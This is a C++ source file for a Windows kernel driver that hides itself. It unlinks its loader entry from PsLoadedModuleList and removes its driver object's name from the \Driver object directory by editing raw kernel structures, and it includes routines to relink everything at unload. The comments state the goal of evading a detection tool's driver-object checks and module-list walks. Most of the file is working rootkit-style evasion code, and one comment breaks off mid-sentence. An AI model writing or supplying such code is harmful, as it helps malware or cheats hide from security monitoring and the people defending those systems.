// Driver hiding: unlink the image from PsLoadedModuleList and remove the driver object's name from the
// object directory. Everything here works on raw kernel structures, no mapping layer in between

// Driver-object hiding is done on raw object-manager structures only: no kernel routine is called anywhere
// here, just reads/writes on the _OBJECT_* layouts in Lib/structs.h. On Win10 19041 x64 the object manager
// always hands out an object body at Header + 0x30, so a body pointer minus 0x30 gets to the OBJECT_HEADER
constexpr uint32_t ObjectHeaderSize = 0x30;

// The object directory hashes every insert into 37 buckets on this build, matching the _OBJECT_DIRECTORY
// layout in Lib/structs.h
constexpr uint32_t ObjectDirectoryBuckets = 37;

// What HideDriverObject changed when it unlinked the driver object's name, so UnhideDriverObject can restore
// it exactly. Hides and unhides are strictly paired (DriverEntry pin / Unload release), one state is enough
struct HiddenObjectState
{
    VOID* Object = nullptr;                                 // the driver object body, used to reach the header again
    _OBJECT_DIRECTORY_ENTRY** Slot = nullptr;               // &HashBuckets[i] or &prev->ChainLink, the slot pointing at the entry
    _OBJECT_DIRECTORY_ENTRY* Entry = nullptr;               // the chain node that was unlinked
    _OBJECT_HEADER_NAME_INFO* NameInfo = nullptr;           // the name info whose QueryReferences was pinned
    uint32_t BucketIndex = 0;                               // bucket the entry was found in, prints only
    bool Saved = false;                                     // false while nothing is hidden
};

HiddenObjectState HiddenObject;

// Removes the driver object's name from the object directory, so walks of \Driver (the reference tool's
// "validate driver objects" check) no longer see the driver at all. The image was already unlinked from the
// module list; this unlink from the directory's hash chain hides the object itself. Everything is manual:
// pin the object, pin its name info, splice the name's chain node out of the bucket it lives in
bool HideDriverObject(win::DRIVER_OBJECT *DriverObject)
{
    if (!DriverObject) return false;
    if (HiddenObject.Saved)
    {
        print(INFO("HideDriver: object %p already hidden, nothing to do"), (void*) DriverObject);
        return true;
    }

    // Body to header: the OBJECT_HEADER sits 0x30 bytes before the body pointer
    auto Header = (_OBJECT_HEADER *) ((uint64_t) DriverObject - ObjectHeaderSize);
    print(INFO("HideDriver: object %p, header %p"), (void*) DriverObject, Header);

    // Sanity: a header with a null type pointer is not an object header we understand, and touching the
    // bucket chain on the wrong layout assumption would corrupt unrelated kernel structures
    if (!Header->Type)
    {
        print(ERROR("HideDriver: header %p has a null type, layout mismatch, aborting"), Header);
        return false;
    }

    // NameInfoOffset 0 means the object carries no name info, i.e. it is already nameless and has no chain
    // node anywhere: there is nothing to unlink and nothing to save
    if (!Header->NameInfoOffset)
    {
        print(WARN("HideDriver: object has no name info (already nameless), nothing to unlink"));
        return true;
    }

    // The name info lives in memory immediately BEFORE the header, at the byte offset stored in
    // NameInfoOffset (offsets shrink going backwards: NameInfoOffset 0x20 puts it right under the header)
    auto NameInfo = (_OBJECT_HEADER_NAME_INFO *) ((uint64_t) Header - Header->NameInfoOffset);
    print(INFO("HideDriver: name info %p (NameInfoOffset %u)"), NameInfo, Header->NameInfoOffset);

    if (!NameInfo->Directory)
    {
        print(WARN("HideDriver: name info %p has no directory, nothing to unlink"), NameInfo);
        return true;
    }

    // Pin the object: one extra reference of our own, the same effect ObReferenceObjectByPointer had. An
    // object whose last reference drops is torn down, and the teardown path would free the very chain node
    // we removed; the pin keeps the object and its name info alive until we relink ourselves
    __atomic_fetch_add(&Header->PointerCount, 1, __ATOMIC_SEQ_CST);
    print(INFO("HideDriver: object pinned, PointerCount incremented atomically"));

    // Pin the name info: QueryReferences is what a name query bumps; while it is pinned the name info is
    // never freed, correctly mirroring what keeps the name alive while unlinked
    __atomic_fetch_add(&NameInfo->QueryReferences, 1, __ATOMIC_SEQ_CST);
    print(INFO("HideDriver: name info pinned, QueryReferences incremented atomically"));

    // Walk all 37 buckets and their chains, looking for the node whose Object is the driver object. Every
    // node carries a naked next pointer, so the walk needs the previous node to know which slot points at
    // the one we found: for a bucket head that is the bucket itself, otherwise the previous node's ChainLink
    _OBJECT_DIRECTORY_ENTRY** Slot = nullptr;
    _OBJECT_DIRECTORY_ENTRY* Entry = nullptr;
    uint32_t FoundBucket = 0;
    for (uint32_t i = 0; i < ObjectDirectoryBuckets && !Entry; ++i)
    {
        _OBJECT_DIRECTORY_ENTRY* Previous = nullptr;    // null while Current is the bucket head
        for (_OBJECT_DIRECTORY_ENTRY* Current = NameInfo->Directory->HashBuckets[i]; Current;
             Previous = Current, Current = Current->ChainLink)
        {
            if (Current->Object == DriverObject)
            {
                Entry = Current;
                Slot = Previous ? &Previous->ChainLink : &NameInfo->Directory->HashBuckets[i];
                FoundBucket = i;
                break;
            }
        }
    }

    // Not in any bucket: the object was never inserted (or was already removed by something else). Undo the
    // pins we took, nothing is unlinked and nothing needs to be kept alive
    if (!Entry)
    {
        __atomic_fetch_add(&NameInfo->QueryReferences, -1, __ATOMIC_SEQ_CST);
        __atomic_fetch_add(&Header->PointerCount, -1, __ATOMIC_SEQ_CST);
        print(WARN("HideDriver: object not found in any hash bucket, pins undone"));
        return false;
    }

    print(INFO("HideDriver: entry %p found in bucket %u"), Entry, FoundBucket);

    // Save exactly what the unlink is about to destroy, so the relink can rebuild the identical chain
    HiddenObject.Object = DriverObject;
    HiddenObject.Slot = Slot;
    HiddenObject.Entry = Entry;
    HiddenObject.NameInfo = NameInfo;
    HiddenObject.BucketIndex = FoundBucket;
    HiddenObject.Saved = true;

    // Manual unlink: make the slot that pointed at the entry point at its successor instead. The entry node
    // itself is left untouched, its ChainLink keeps describing where it sat, which makes relinking trivial.
    // While unlinked the node stays alive, because (a) PointerCount is pinned so no reference transition
    // triggers ObpDeleteNameCheck (the only thing that would free the name behind our back) and (b)
    // QueryReferences is pinned so the name info is not freed even though nothing else names it. The object
    // also stays PERMANENT; hiding no longer flips that flag, which was ObMakeTemporaryObject's doing.
    // Staying permanent is safer: a permanent object can never be freed while the driver runs, and the
    // kernel's own unload path (IopDeleteDriver) makes the object temporary itself before its final
    // dereference, so there is no leak on unload either
    *Slot = Entry->ChainLink;
    print(OK("HideDriver: entry %p unlinked from bucket %u, object invisible to directory walks"),
          Entry, FoundBucket);
    return true;
}

// Inverse of HideDriverObject: puts the name's chain node back and releases both pins. Called at unload,
// after everything else; while this code runs, the saved state is the only map back into the directory
void UnhideDriverObject()
{
    if (!HiddenObject.Saved) return;

    // Relink exactly: the slot that pointed at the entry (bucket head or previous node) is pointed at the
    // entry again, restoring the chain byte for byte, whatever the buckets looked like in between
    *HiddenObject.Slot = HiddenObject.Entry;

    // Release the pins in reverse order of taking them: name info first, then the object. Both decrements
    // are atomic for the same reason the increments were
    auto Header = (_OBJECT_HEADER *) ((uint64_t) HiddenObject.Object - ObjectHeaderSize);
    __atomic_fetch_add(&HiddenObject.NameInfo->QueryReferences, -1, __ATOMIC_SEQ_CST);
    __atomic_fetch_add(&Header->PointerCount, -1, __ATOMIC_SEQ_CST);

    print(OK("HideDriver: entry %p relinked into bucket %u, pins released"),
          HiddenObject.Entry, HiddenObject.BucketIndex);
    HiddenObject = {};
}

// Removes the driver itself from the kernel's loaded module list, so module walks (PsLoadedModuleList) no longer
// report it. DriverSection is the loader entry (_KLDR_DATA_TABLE_ENTRY) the kernel created at load time. A manually
bool UnlinkDriverFromModuleList(win::DRIVER_OBJECT *DriverObject)
{
    if (!DriverObject || !DriverObject->DriverSection)
    {
        print(ERROR("UnlinkDriver: no DriverObject or DriverSection, nothing to unlink"));
        return false;
    }

    auto Entry = (_KLDR_DATA_TABLE_ENTRY *) DriverObject->DriverSection;
    print(INFO("UnlinkDriver: entry %p, DllBase %p, name %ws"), (void *) Entry, Entry->DllBase,
          Entry->BaseDllName.Length ? Entry->BaseDllName.Buffer : L"");

    // Sanity: the loader entry must describe the driver image itself
    if ((address) Entry->DllBase != DriverObject->DriverStart)
    {
        print(ERROR("UnlinkDriver: entry DllBase %p does not match DriverStart %p"),
              Entry->DllBase, DriverObject->DriverStart);
        return false;
    }

    // Bypass the entry in the doubly linked list, then make its own pointers point at itself, so a later walk that
    // starts inside this entry does not go anywhere
    _LIST_ENTRY *Links = &Entry->InLoadOrderLinks;
    _LIST_ENTRY *Flink = Links->Flink;
    _LIST_ENTRY *Blink = Links->Blink;
    if (!Flink || !Blink || Flink == Links || Blink == Links)
    {
        print(ERROR("UnlinkDriver: entry links are not connected to the list"));
        return false;
    }

    Blink->Flink = Flink;
    Flink->Blink = Blink;
    Links->Flink = Links;
    Links->Blink = Links;

    // Verify: walk the list from the head and confirm the entry is gone. The bound keeps a corrupt list from
    // turning this into an endless walk
    _LIST_ENTRY *Head = (_LIST_ENTRY *) __imp_PsLoadedModuleList;
    constexpr uint32_t MaxWalk = 4096;
    uint32_t Count = 0;
    bool Found = false;
    for (_LIST_ENTRY *Current = Head->Flink; Current && Current != Head && Count < MaxWalk; Current = Current->Flink)
    {
        Count++;
        if (Current == Links)
        {
            Found = true;
            break;
        }
    }

    if (Found) print(ERROR("UnlinkDriver: VERIFY FAILED, entry still reachable from the list head"));
    else if (Count < MaxWalk) print(OK("UnlinkDriver: verified hidden, %u modules left"), Count);
    else print(WARN("UnlinkDriver: verify walk did not end cleanly after %u steps"), MaxWalk);
    return true;
}

// Reverse of UnlinkDriverFromModuleList: re-attaches the driver's loader entry at the PsLoadedModuleList head.
// Must run in Unload BEFORE returning to Mm. Mm's unload path removes the entry it created at load time; an entry
// that stays detached leaves the loader-list bookkeeping inconsistent and the NEXT load of this driver bugchecks
// 0x1A (0x2101) inside MiProcessLoaderEntry before DriverEntry ever runs
bool RelinkDriverIntoModuleList(win::DRIVER_OBJECT *DriverObject)
{
    if (!DriverObject || !DriverObject->DriverSection)
    {
        print(ERROR("RelinkDriver: no DriverObject or DriverSection, nothing to relink"));
        return false;
    }

    auto Entry = (_KLDR_DATA_TABLE_ENTRY *) DriverObject->DriverSection;
    _LIST_ENTRY *Links = &Entry->InLoadOrderLinks;
    _LIST_ENTRY *Head = (_LIST_ENTRY *) __imp_PsLoadedModuleList;

    // Already attached? A guard walk from the head keeps a double relink from turning the list into a loop
    constexpr uint32_t MaxWalk = 4096;
    uint32_t Count = 0;
    for (_LIST_ENTRY *Current = Head->Flink; Current && Current != Head && Count < MaxWalk; Current = Current->Flink)
    {
        Count++;
        if (Current == Links)
        {
            print(INFO("RelinkDriver: entry %p already attached, skipping"), (void *) Entry);
            return true;
        }
    }

    if (!Head->Flink)
    {
        print(ERROR("RelinkDriver: list head Flink is null, list looks corrupt"));
        return false;
    }

    // Splice at the head, same spot the kernel uses for freshly loaded images. No stale-neighbor bookkeeping, so
    // the result stays valid even though the list changed while the entry was detached
    Links->Blink = Head;
    Links->Flink = Head->Flink;
    Head->Flink->Blink = Links;
    Head->Flink = Links;

    print(OK("RelinkDriver: entry %p re-attached at the list head"), (void *) Entry);
    return true;
}
